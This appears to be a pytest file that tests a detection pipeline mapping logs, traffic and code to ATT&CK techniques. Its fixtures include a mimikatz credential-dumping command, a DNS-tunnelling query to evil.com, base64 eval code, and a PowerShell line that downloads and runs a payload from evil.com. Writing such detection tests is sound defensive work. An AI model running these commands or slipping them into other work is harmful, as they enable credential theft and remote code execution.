import pytest
from attack_core import ATTACKIndex, ATTACKLoader
from detection_engine import DetectionPipeline


@pytest.fixture
def pipeline():
    loader = ATTACKLoader()
    index = ATTACKIndex(loader)
    return DetectionPipeline(index)


def test_pipeline_initialization(pipeline):
    assert pipeline.log is not None
    assert pipeline.traffic is not None
    assert pipeline.behavior is not None
    assert pipeline.event is not None
    assert pipeline.code is not None


def test_log_detector_powershell(pipeline):
    logs = [
        {
            "event_id": 4688,
            "message": "powershell.exe -enc SGVsbG8=",
            "host": "TEST-HOST",
            "timestamp": "2024-01-01T00:00:00Z",
            "source_type": "windows",
            "fields": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        }
    ]
    findings = pipeline.run({"logs": logs})
    assert len(findings) > 0
    ps_findings = [f for f in findings if "T1059" in [m.technique_id for m in f.mappings]]
    assert len(ps_findings) > 0


def test_log_detector_credential_dumping(pipeline):
    logs = [
        {
            "event_id": 4688,
            "message": "mimikatz.exe sekurlsa::logonpasswords",
            "host": "TEST-HOST",
            "timestamp": "2024-01-01T00:00:00Z",
            "source_type": "windows",
            "fields": {"Image": "mimikatz.exe"},
        }
    ]
    findings = pipeline.run({"logs": logs})
    cred_findings = [f for f in findings if any("T1003" in m.technique_id for m in f.mappings)]
    assert len(cred_findings) > 0


def test_traffic_detector_beaconing(pipeline):
    traffic = []
    base_ts = 1704067200.0
    for i in range(15):
        traffic.append(
            {
                "record_type": "conn",
                "src_ip": "10.0.0.5",
                "dst_ip": "1.2.3.4",
                "dst_port": 443,
                "proto": "tcp",
                "bytes_out": 1024,
                "bytes_in": 512,
                "duration": 0.1,
                "timestamp": base_ts + i * 60.0,
            }
        )
    findings = pipeline.run({"traffic": traffic})
    beacon_findings = [
        f for f in findings if any(m.technique_id.startswith("T1071") for m in f.mappings)
    ]
    assert len(beacon_findings) > 0


def test_traffic_detector_dns_tunneling(pipeline):
    import random
    import string

    query = "".join(random.choices(string.ascii_letters + string.digits, k=60)) + ".evil.com"
    traffic = [
        {
            "record_type": "dns",
            "query": query,
            "qtype_name": "TXT",
            "src_ip": "10.0.0.5",
            "timestamp": 1000.0,
        }
    ]
    findings = pipeline.run({"traffic": traffic})
    dns_findings = [
        f for f in findings if any(m.technique_id.startswith("T1048") for m in f.mappings)
    ]
    assert len(dns_findings) > 0


def test_code_detector_python_eval(pipeline):
    code = [
        {
            "source_code": "eval(base64.b64decode('ZXZhbCgxKQ=='))",
            "file_path": "malicious.py",
            "language": "python",
            "timestamp": "2024-01-01T00:00:00Z",
        }
    ]
    findings = pipeline.run({"code": code})
    eval_findings = [f for f in findings if "T1059" in [m.technique_id for m in f.mappings]]
    assert len(eval_findings) > 0


def test_code_detector_powershell_iex(pipeline):
    code = [
        {
            "source_code": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            "file_path": "script.ps1",
            "language": "powershell",
        }
    ]
    findings = pipeline.run({"code": code})
    ps_findings = [f for f in findings if "T1059" in [m.technique_id for m in f.mappings]]
    assert len(ps_findings) > 0


def test_serialization(pipeline):
    logs = [
        {
            "event_id": 4688,
            "message": "powershell.exe -enc test",
            "host": "TEST-HOST",
            "timestamp": "2024-01-01T00:00:00Z",
            "source_type": "windows",
            "fields": {},
        }
    ]
    findings = pipeline.run({"logs": logs})
    serialized = pipeline.run_and_serialize({"logs": logs})
    assert len(serialized) == len(findings)
    for s in serialized:
        assert "attack_mappings" in s
        assert isinstance(s["attack_mappings"], list)
        assert all("technique_id" in m for m in s["attack_mappings"])
